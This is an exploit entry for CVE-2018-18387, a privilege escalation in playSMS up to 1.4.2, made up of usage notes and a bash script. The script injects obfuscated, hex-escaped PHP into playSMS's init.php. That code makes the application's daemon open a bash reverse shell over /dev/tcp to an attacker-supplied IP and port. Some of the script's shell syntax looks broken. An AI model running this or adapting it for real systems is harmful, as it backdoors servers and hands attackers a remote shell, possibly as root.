# Exploit Title: playSMS < = 1.4.2 - Privilege escalation
# Date: 16-10-2018
# Software Link: https://github.com/antonraharja/playSMS
# Exploit Authors: @ChrisMiller#MasterExploiter @7ҥƹ_bl1Ɲɖ#9897 @L1nkkk#7897  @Thunder-Son#1872 @Strange Penguin#9999 @stonepresto#5921 @zdravich#0496 @🐼PandaSt0rm🐼#0916
# Contact: Discord
# CVE: CVE-2018-18387
# Category: webapps
# A vulnerability in playSMS/web/init.php was discovered which leads to switching to the user running the playSMS application by abusing a daemon process. e.g. If playSMS is running is root, full system compromise is achieved
#
# Requirements:
# Access to the machine, e.g. CVE-2017-9101
# Attacker must be able to edit playSMS related files
#
# usage:
# git clone https://github.com/TheeBlind/CVE-2018-18387/blob/master/playSMS_Damemon_Privesc.sh
# change the Evil_ip and the Evil_Port in harcoded reverse shell
# chmod +x playSMS_Damemon_Privesc.sh
# ./playSMS_Damemon_Privesc.sh
#


!/bin/bash
playsms="/var/www/html/playsms"
init="/var/www/html/playsms/init.php"
Shell_Controll="/tmp/controll.txt"

if [ -d "$playsms" ];
then
    echo "$playsms exists as a directory"
else
    echo "$playsms doesn't exist as a directory, aborting."
    exit
fi
if [ -e "$init" ];
then
    echo "$init exists in playsms"
else
    echo "$init doens't exist in play sms, aborting."
    exit
fi
if [ touch $Shell_Controll ];
then
    echo "1" > $Shell_Controll
else
    echo "Shell_Controll can not be deployed, aborting."
    exit
fi
if [ -w "$init" ]
then
    echo "Write permission is granted on $init"
else
    echo "Write permission is NOT granted on $init"
    exit
fi
if [ sed -i '/DAEMON_PROCESS;/a if($CORE_CONFIG\x5B\x27DAEMON_PROCESS\x27\x5D) {\x0Aif ((bool)file_get_contents(\x27\x2Ftmp\x2Fcontroll.txt\x27)) {\x0A\x60\x2Fbin\x2Fbash -c \x27bash -i >& \x2Fdev\x2Ftcp\x2FEvil_ip\x2FEvil_Port 0>&1\x27\x60\x3B\x0Afile_put_contents(\x27\x2Ftmp\x2Fcontroll\.txt\x27\x2c0)\x3B}}' $init]
    echo "Daemon abused ... check nc"
else
    echo "Patched, aborting."
    exit
fi
